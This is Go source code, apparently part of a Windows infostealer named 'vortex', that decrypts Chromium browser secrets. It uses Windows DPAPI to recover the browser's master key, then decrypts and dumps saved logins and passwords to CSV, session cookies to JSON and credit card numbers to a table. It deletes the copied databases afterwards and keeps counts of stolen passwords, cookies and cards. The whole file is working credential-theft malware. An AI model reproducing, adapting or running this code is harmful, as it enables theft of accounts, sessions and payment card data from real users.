//go:build windows

package browser

import (
	"crypto/aes"
	"crypto/cipher"
	"database/sql"
	"encoding/base64"
	"encoding/csv"
	"encoding/json"
	"errors"
	"io"
	"net/url"
	"os"
	"path/filepath"
	"strings"
	"syscall"
	"unsafe"
	"vortex/hutil"

	"github.com/olekukonko/tablewriter"
)

var (
	dllcrypt32      = syscall.NewLazyDLL("Crypt32.dll")
	dllkernel32     = syscall.NewLazyDLL("kernel32.dll")
	procDecryptData = dllcrypt32.NewProc("CryptUnprotectData")
	procLocalFree   = dllkernel32.NewProc("LocalFree")
)

type ChromeData struct {
	MasterKey []byte
}

type DATA_BLOB struct {
	cbData uint32
	pbData *byte
}

func newBlob(d []byte) *DATA_BLOB {
	if len(d) == 0 {
		return &DATA_BLOB{}
	}

	return &DATA_BLOB{
		pbData: &d[0],
		cbData: uint32(len(d)),
	}
}

type CookiesInfo struct {
	Domain         string `json:"domain"`
	ExpirationDate int64  `json:"expirationDate"`
	HostOnly       bool   `json:"hostOnly"`
	HttpOnly       bool   `json:"httpOnly"`
	Name           string `json:"name"`
	Path           string `json:"path"`
	Value          string `json:"value"`
}

func (datablob *DATA_BLOB) toByteArray() []byte {
	d := make([]byte, datablob.cbData)
	copy(d, (*[1 << 30]byte)(unsafe.Pointer(datablob.pbData))[:])
	return d
}

func chromiumDecryptor(data []byte) ([]byte, error) {
	var outblob DATA_BLOB
	r, _, err := procDecryptData.Call(uintptr(unsafe.Pointer(newBlob(data))), 0, 0, 0, 0, 0, uintptr(unsafe.Pointer(&outblob)))
	if r == 0 {
		return nil, err
	}
	defer procLocalFree.Call(uintptr(unsafe.Pointer(outblob.pbData)))

	return outblob.toByteArray(), nil
}

func chromiumMasterKey(localStatePath string) (ChromeData, error) {
	var (
		data        ChromeData
		decodedJson map[string]interface{}
	)

	jsonFile, err := os.Open(localStatePath)
	if err != nil {
		return data, err
	}
	defer jsonFile.Close()

	byteValue, err := io.ReadAll(jsonFile)
	if err != nil {
		return data, err
	}

	json.Unmarshal([]byte(byteValue), &decodedJson)
	encKey := decodedJson["os_crypt"].(map[string]interface{})["encrypted_key"].(string)
	decodedKey, _ := base64.StdEncoding.DecodeString(encKey)
	strKey := strings.Trim(string(decodedKey), "DPAPI")
	data.MasterKey, err = chromiumDecryptor([]byte(strKey))
	if err != nil {
		return data, nil
	}

	return data, nil
}

func chromiumV80Decrypt(localStatePath string, encrypted []byte) (string, error) {
	chromeKey, _ := chromiumMasterKey(localStatePath)

	if strings.HasPrefix(string(encrypted), "v10") || strings.HasPrefix(string(encrypted), "v11") {
		encrypted = []byte(strings.Trim(string(encrypted), "v10"))
		encrypted = []byte(strings.Trim(string(encrypted), "v11"))
	}

	cipherText := encrypted
	c, err := aes.NewCipher(chromeKey.MasterKey)
	if err != nil {
		return "", err
	}

	gcm, err := cipher.NewGCM(c)
	if err != nil {
		return "", err
	}

	nonceSize := gcm.NonceSize()
	if len(cipherText) < nonceSize {
		return "", errors.New("ciphertext is less than nonce")
	}

	nonce, cipherText := cipherText[:nonceSize], cipherText[nonceSize:]
	plainText, err := gcm.Open(nil, nonce, cipherText, nil)
	if err != nil {
		if err.Error() == "cipher: message authentication failed" {
			return "", nil
		}
		return "", err
	}

	return string(plainText), nil
}

func createChromiumDumpingFiles(mainFolder string, dbLocation string, outputFile string) (string, string, error) {

	dbNewLocation := filepath.Join(mainFolder, filepath.Base(dbLocation))
	outputFileLocation := filepath.Join(mainFolder, outputFile)

	file, err := os.Create(outputFileLocation)
	if err != nil {
		return "", "", err
	}
	defer file.Close()

	if err = hutil.CopyFile(dbLocation, dbNewLocation); err != nil {
		return "", "", err
	}

	return outputFileLocation, dbNewLocation, nil
}

func dumpChromiumLoginData(mainFolder string, loginDBPath string, localStatePath string, outDumpFile string) error {
	filex, dbLocation, err := createChromiumDumpingFiles(mainFolder, loginDBPath, outDumpFile)
	if err != nil {
		return err
	}

	file, err := os.OpenFile(filex, os.O_RDWR, 0775)
	if err != nil {
		return err
	}
	defer file.Close()

	csvWriter := csv.NewWriter(file)
	defer csvWriter.Flush()

	if err = csvWriter.Write([]string{"name", "url", "username", "password", "note"}); err != nil {
		return err
	}

	db, err := sql.Open("sqlite3", dbLocation)
	if err != nil {
		return err
	}

	rows, err := db.Query("select origin_url, username_value, password_value from logins")
	if err != nil {
		return err
	}
	defer rows.Close()

	for rows.Next() {
		var (
			URL         string
			Domain      string
			Username    string
			EncPassword string
			Password    string
		)

		if err = rows.Scan(&URL, &Username, &EncPassword); err != nil {
			return err
		}

		Password, _ = chromiumV80Decrypt(localStatePath, []byte(EncPassword))

		parsedURL, _ := url.Parse(URL)
		Domain = parsedURL.Hostname()

		if err = csvWriter.Write([]string{Domain, URL, Username, Password, ""}); err != nil {
			return err
		}

		hutil.PasswordCounter++
	}

	if err = db.Close(); err != nil {
		return err
	}

	if err = os.Remove(dbLocation); err != nil {
		return err
	}

	return nil
}

func dumpChromiumBasedCookies(mainFolder string, cookiesDB string, localStatePath string, outDumpFile string) error {
	var cookiesInfo []CookiesInfo
	filex, dbLocation, err := createChromiumDumpingFiles(mainFolder, cookiesDB, outDumpFile)
	if err != nil {
		return err
	}

	file, err := os.OpenFile(filex, os.O_RDWR, 0775)
	if err != nil {
		return err
	}
	defer file.Close()

	db, err := sql.Open("sqlite3", dbLocation)
	if err != nil {
		return err
	}

	rows, err := db.Query("select host_key, expires_utc, is_httponly, name, path, encrypted_value from cookies")
	if err != nil {
		return err
	}
	defer rows.Close()

	for rows.Next() {
		var (
			cookie         CookiesInfo
			EncryptedValue string
		)

		if err = rows.Scan(&cookie.Domain, &cookie.ExpirationDate, &cookie.HttpOnly, &cookie.Name, &cookie.Path, &EncryptedValue); err != nil {
			return err
		}

		cookie.Value, _ = chromiumV80Decrypt(localStatePath, []byte(EncryptedValue))
		cookiesInfo = append(cookiesInfo, cookie)
		hutil.CookieCounter++
	}

	encoder := json.NewEncoder(file)
	if err = encoder.Encode(cookiesInfo); err != nil {
		return err
	}

	if err = db.Close(); err != nil {
		return err
	}

	if err = os.Remove(dbLocation); err != nil {
		return err
	}

	return nil
}

func dumpChromiumBasedCreditCards(mainFolder string, ccDB string, localStatePath string, outDumpFile string) error {
	filex, dbLocation, err := createChromiumDumpingFiles(mainFolder, ccDB, outDumpFile)
	if err != nil {
		return err
	}

	file, err := os.OpenFile(filex, os.O_RDWR, 0775)
	if err != nil {
		return err
	}
	defer file.Close()

	creds := tablewriter.NewWriter(file)
	creds.SetAlignment(tablewriter.ALIGN_LEFT)
	creds.SetBorders(tablewriter.Border{Left: true, Top: false, Right: true, Bottom: false})
	creds.SetCenterSeparator("|")
	creds.SetHeader([]string{
		"card name holder",
		"card number",
		"expiration month",
		"expiration year",
	})

	db, err := sql.Open("sqlite3", dbLocation)
	if err != nil {
		return err
	}

	rows, err := db.Query("select name_on_card, card_number_encrypted, expiration_month, expiration_year from credit_cards")
	if err != nil {
		return err
	}
	defer rows.Close()

	for rows.Next() {
		var (
			CardHolder          string
			EncryptedCardNumber string
			CardNumber          string
			ExpirationMonth     string
			ExpirationYear      string
		)

		if err = rows.Scan(&CardHolder, &EncryptedCardNumber, &ExpirationMonth, &ExpirationYear); err != nil {
			return err
		}

		CardNumber, err = chromiumV80Decrypt(localStatePath, []byte(EncryptedCardNumber))
		if err != nil {
			return nil
		}

		creds.Append([]string{
			CardHolder,
			CardNumber,
			ExpirationMonth,
			ExpirationYear,
		})
	}

	creds.Render()
	db.Close()

	if err = os.Remove(dbLocation); err != nil {
		return err
	}

	hutil.CreditCardCounter += creds.NumLines()

	return nil
}
